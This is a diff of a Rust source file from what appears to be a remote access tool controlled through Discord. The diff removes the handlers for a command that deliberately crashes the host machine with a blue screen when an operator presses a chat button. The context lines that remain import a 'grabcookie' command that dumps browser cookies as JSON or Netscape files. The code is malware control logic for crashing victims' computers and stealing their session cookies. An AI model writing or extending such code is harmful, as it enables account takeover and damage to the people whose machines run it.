@@ -10,7 +10,6 @@ use crate::config::Config;
 use crate::log_debug;
 
 use crate::commands::filesystem::grabcookie::{GrabCookieCommand, GRAB_JSON_BUTTON, GRAB_NETSCAPE_BUTTON};
-use crate::commands::system::bsod::{BsodCommand, BSOD_CONFIRM_BUTTON, BSOD_CANCEL_BUTTON};
 
 pub async fn handle_message(
     http: &Arc<HttpClient>,
@@ -102,59 +101,6 @@ pub async fn handle_interaction(
             .ok_or_else(|| anyhow::anyhow!("No channel in interaction"))?;
 
         match custom_id.as_str() {
-            // from bsod.rs
-            // ----------------------------------------
-            BSOD_CONFIRM_BUTTON => {
-                http.interaction(interaction.application_id)
-                    .create_response(
-                        interaction.id,
-                        &interaction.token,
-                        &InteractionResponse {
-                            kind: InteractionResponseType::DeferredUpdateMessage,
-                            data: None,
-                        },
-                    )
-                    .await?;
-
-                if let Some(msg) = &interaction.message {
-                    let _ = http.delete_message(channel_id, msg.id).await;
-                }
-
-                http.create_message(channel_id)
-                    .content("**Triggering BSOD...**")
-                    .await?;
-
-                tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
-                match BsodCommand::trigger_bsod() {
-                    Ok(_) => {
-                        // ...
-                    }
-                    Err(e) => {
-                        http.create_message(channel_id)
-                            .content(&format!("BSOD failed: {}", e))
-                            .await?;
-                    }
-                }
-            }
-
-            BSOD_CANCEL_BUTTON => {
-                http.interaction(interaction.application_id)
-                    .create_response(
-                        interaction.id,
-                        &interaction.token,
-                        &InteractionResponse {
-                            kind: InteractionResponseType::DeferredUpdateMessage,
-                            data: None,
-                        },
-                    )
-                    .await?;
-
-                if let Some(msg) = &interaction.message {
-                    let _ = http.delete_message(channel_id, msg.id).await;
-                }
-                http.create_message(channel_id).content("BSOD cancelled").await?;
-            }
-
             // from grabcookie.rs
             // ----------------------------------------
             GRAB_JSON_BUTTON => {
